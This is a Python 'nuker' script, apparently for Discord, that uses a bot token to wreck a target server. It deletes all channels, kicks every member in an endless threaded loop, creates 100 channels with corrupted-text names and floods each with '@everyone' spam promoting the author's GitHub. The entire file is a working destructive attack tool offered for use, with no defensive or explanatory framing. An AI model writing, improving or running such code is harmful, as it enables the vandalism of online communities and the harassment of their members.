from os import system
import config  # Importa il file config.py

p = '\033[97m' #bianco
w = '\033[31m' #rosso
b = '\033[32m' #verde

def print_logo():
    system("cls || clear")
    print()
    print()
    print(w + '                        ╔═╗╔╗╔╔═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗')
    print(w + '                        ╠═╝║║║║ ╦║ ║  ║║║║ ║╠╩╗║╣ ╠╦╝')
    print(w + '                        ╩  ╝╚╝╚═╝╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═')
    print()
    print(w + '                           Developed by: pngu')
    print()
    print(p + '                            [!] Your bot is ' + b + 'ON')
    print(p + '                            [~] Insert the ' + w + 'Guild ID')
    print(p + '                            [~] READY TO ' + w + 'NUKE' + p +'')
    print()

try:
    import requests
    import time
    import threading
    import random
except:

    print("Required modules not found, installing them...")
    system("python -m pip install requests")
    system("python3 -m pip install requests")
    system("python -m pip install discord")
    system("python3 -m pip install discord")
    print("All modules should be installed, please restart the script.")
    input("Press enter to restart...")
print_logo()
# All parameters
LINK = ' https://github.com/ThatzPingu'
MESSAGES = [
    '@everyone Gҽƚ ϝυƈƙҽԃ Ⴆყ Pɳɠυ Nυƙҽɾ' + LINK
]
CHANNEL_NAMES = [
    '🦠・d̸̡̩͍̔ͥ͜ę̷̵̧̖̫̗̆̊s̩͙͖̋͛͟t̴͕͖͓̀r̶̷̲͍̭͐̾̀͟ȍ̸̢̢̮͚̐̚y̯̤͑́́̓́ę̷̵̧̖̫̗̆̊d̸̡̩͍̔ͥ͜-b̵̸͙̅̽͡ͅy̯̤͑́́̓́-p̶̸̨̺͊̍̒̓̀n̷̶̯͉̊̽̐ͦ͘g̴̶̛̮̣͙͠û̶͙̽̿͆̈'
]

GUILD = int(input(" Enter guild id: "))

# Utilizza il token definito nel file config.py
TOKEN = config.TOKEN

USEPROXY = False  # Disabling proxy usage
print("Using proxies" if USEPROXY else "")
headers = {'authorization': f'Bot {TOKEN}'}

def get_all_channels():
    while True:
        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                return r.json()
            else:
                return


def get_all_members():
    members = []
    url = f'https://discord.com/api/v10/guilds/{GUILD}/members?limit=1000'

    while True:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            members_data = response.json()
            members.extend(members_data)
            if 'next' in response.json():
                url = response.json()['next']
            else:
                break
        elif response.status_code == 429:
            time.sleep(int(response.headers.get('Retry-After', 1)))
        else:
            print(f"Failed to fetch members. Status code: {response.status_code}")
            return None

    return members


def remove_channel(chnl):
    while True:
        r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                print(f"[+] Removed channel: {chnl}")
                return


def channel(name):
    while True:
        json = {'name': name, 'type': 0}
        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                id = r.json()["id"]
                print(f"[+] Created channel: {id}")
                threading.Thread(target=send_message, args=(id,)).start()
                return
            else:
                continue


def send_message(id):
    while True:
        json = {'content': random.choice(MESSAGES)}
        r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])


def kick_member(id):
    while True:
        url = f'https://discord.com/api/v10/guilds/{GUILD}/members/{id}'
        response = requests.delete(url, headers=headers)

        if response.status_code == 204:
            print(f"Successfully kicked member: {id}")
            return


def remove_channels():
    for channel_id in channel_ids:
        threading.Thread(target=remove_channel, args=(channel_id,)).start()


def remove_members():
    time.sleep(2)
    while True:
        for profile in get_all_members():
            threading.Thread(target=kick_member, args=(profile['user']['id'],)).start()


def get_proxy():
    if not USEPROXY:
        return None
    PROXY = random.choice(PROXIES)
    return {"http": PROXY, "https": PROXY}


threading.Thread(target=remove_members).start()
channel_ids = [channel['id'] for channel in get_all_channels()]
if len(channel_ids) != 0:
    remove_channels()
else:
    print("No channels found.")
for _ in range(100):
    threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
